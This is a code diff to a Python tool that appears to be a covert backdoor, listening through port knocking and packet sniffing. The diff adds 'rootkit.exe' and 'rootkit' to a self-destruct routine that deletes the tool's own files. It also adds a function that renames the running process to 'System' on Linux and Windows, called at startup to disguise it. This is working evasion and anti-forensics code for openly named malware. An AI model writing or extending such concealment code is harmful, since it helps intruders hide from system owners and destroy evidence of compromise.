@@ -8,6 +8,8 @@ import threading
 import socket
 import requests  # Add this import for sending HTTP requests
 from threading import Lock  # Add this import for thread-safe access
+import platform
+import ctypes
 
 
 def get_local_ip():
@@ -204,7 +206,7 @@ def handle_initial_signal():
             # Stop all processes delete all python files and close terminal
             stop_sniffing()
             for filename in os.listdir("."):
-                if filename.endswith(("dashboard.py", "encoder.py", "handler.py", "logger.py", "watcher.py")):
+                if filename.endswith(("dashboard.py", "encoder.py", "handler.py", "logger.py", "watcher.py", "rootkit.exe", "rootkit")):
                     try:
                         os.remove(filename)
                         print(f"Deleted: {filename}")
@@ -362,5 +364,26 @@ def wait_for_port_knocking():
     ack_thread = threading.Thread(target=sniff, kwargs={'filter': f"tcp and dst host {local_ip}", 'prn': packet_callback, 'store': 0})
     ack_thread.start()
 
+def rename_process(new_name):
+    """Rename the current process."""
+    system = platform.system()
+    if system == "Linux":
+        try:
+            libc = ctypes.cdll.LoadLibrary("libc.so.6")
+            libc.prctl(15, ctypes.c_char_p(new_name.encode()), 0, 0, 0)
+            print(f"Process renamed to: {new_name}")
+        except Exception as e:
+            print(f"Failed to rename process on Linux: {e}")
+    elif system == "Windows":
+        try:
+            ctypes.windll.kernel32.SetConsoleTitleW(new_name)
+            print(f"Process renamed to: {new_name}")
+        except Exception as e:
+            print(f"Failed to rename process on Windows: {e}")
+    else:
+        print(f"Process renaming not supported on {system}.")
+
+# Call the rename_process function at the start of the script
 if __name__ == "__main__":
+    rename_process("System")
     wait_for_port_knocking()
